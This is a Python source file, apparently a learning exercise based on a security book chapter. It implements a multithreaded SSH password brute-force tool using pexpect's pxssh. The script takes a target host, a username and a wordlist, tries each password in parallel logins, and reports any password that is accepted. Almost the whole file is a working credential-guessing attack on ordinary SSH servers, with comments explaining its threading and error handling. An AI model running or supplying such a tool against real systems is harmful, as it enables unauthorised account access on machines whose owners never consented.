# SSH brute force with pxssh class based on chapter 2
# Python 3.4

"""

Because of how the PXSSH's ssh was implemented, every failed attempt it will spawn a GUI pop-up,
asking for the password of the ssh. I've checked the psxxh.py file under
/usr/local/lib/python3.4/dist-packages/pexpect/pxssh.py and i've tweaked with it according with the suggestions,
but without success:

    http://stackoverflow.com/questions/20832740/python-pxssh-gui-spawn-on-login-failure
    and
    http://stackoverflow.com/questions/28685371/python-2-6-pxssh-password-gui-spawned-on-login-failure

Every time that the script is executed and fails at a password, the pop-up will be displayed.

"""

# Pxssh is part of pexpect library. Its a specialized class for set up SSH connections, handle login, logout,
# exceptions, etc...
from pexpect import pxssh
import argparse
import time
import threading

# Define the max number of threads created.
maxConnections = 5

# A semaphore's implementation for control the number of threads spawned by the application.
# Useful in controlling access to limited resources.
connection_lock = threading.BoundedSemaphore(value=maxConnections)

# Register in case of a password is found.
Found = False

# Register the number of connection errors.
Fail = 0


def connect(host, user, password, release):

    # Global's are variable which can be accessed at any place at the script.
    # They are not limited inside the function's scope, thereby can be modified and read by anyone.
    global Found
    global Fail

    # Initializes the pxssh class, starts the connection with values sent by main()
    # and returns true in case of a successful connection.
    try:

        ssh = pxssh.pxssh()
        ssh.login(host, user, password)
        print("[+]Password found: {0}".format(password))
        Found = True

    # For python 3.4 there been a change in how exceptions must be handled.
    except Exception as error:

        # The errors defined here are created by the pxssh class and not by the ssh server.
        # The nonblocking's exception is thrown when the server reach its maximum connections limit.
        if 'read_nonblocking' in str(error):
            Fail += 1
            time.sleep(5)
            connect(host, user, password, False)

        # The synchronize ....This exception is thrown when the pxssh fails in obtaining a shell prompt.
        elif 'synchronize with original prompt' in str(error):
            time.sleep(1)
            connect(host, user, password, False)

        # The password refused exception....
        elif 'password refused':
            pass

    finally:

        # After that a successful connection to the target host and verification of one password,
        # it will release the lock so another thread execute the connect with a new password for checking.
        # The release doesn't mean that the password was accepted, only that the try was successful.
        if release: connection_lock.release()


def main():

    # Defines the options and the help menu.
    parser = argparse.ArgumentParser(description="Simple Python SSH Brute Force")
    parser.add_argument('Target', help="Target host.")
    parser.add_argument('User', help="User for ssh connection.")
    parser.add_argument('PassFile', help="File with a password per line.")

    # Receives the arguments sent by the user.
    args = parser.parse_args()
    tgtHost = args.Target
    user = args.User
    passFile = args.PassFile

    # If anything is not set , prints the help menu from argparse and exits.
    if tgtHost == None or user == None or passFile == None:
        print(parser.usage)
        exit(0)

    # I chose this instead of the example from the book because it will close the password file after its execution.
    # Diethrich Epp explains why:
    # http://stackoverflow.com/questions/11555468/how-should-i-read-a-file-line-by-line-in-python
    with open(passFile, 'r') as passwords:

        for line in passwords.readlines():

            if Found:
                print("[*]Password found...exiting.\n")
                exit(0)

            if Fail > 5:
                print("[-]Too many socket timeouts...exiting")
                exit(1)

                # For each connection attempt, it will reserve a resource before run. If no ( maxConnections ) resource
                # is available, it will wait until a release occurs.
            connection_lock.acquire()

            # Removes spaces and line breaks before pass it as argument.
            password = line.strip('\r').strip('\n')
            print("[*]Testing password {0}".format(password))

            # Creates the thread for its execution in parallel and it will always
            # try a password more than it should need.
            # Execute the script and you'll understand what I mean. It bothers me but I couldn't solve it....for now.
            bruteForce = threading.Thread(target=connect, args=(tgtHost, user, password, True))

            # Starts the thread.
            child = bruteForce.start()

if __name__ == '__main__':
    main()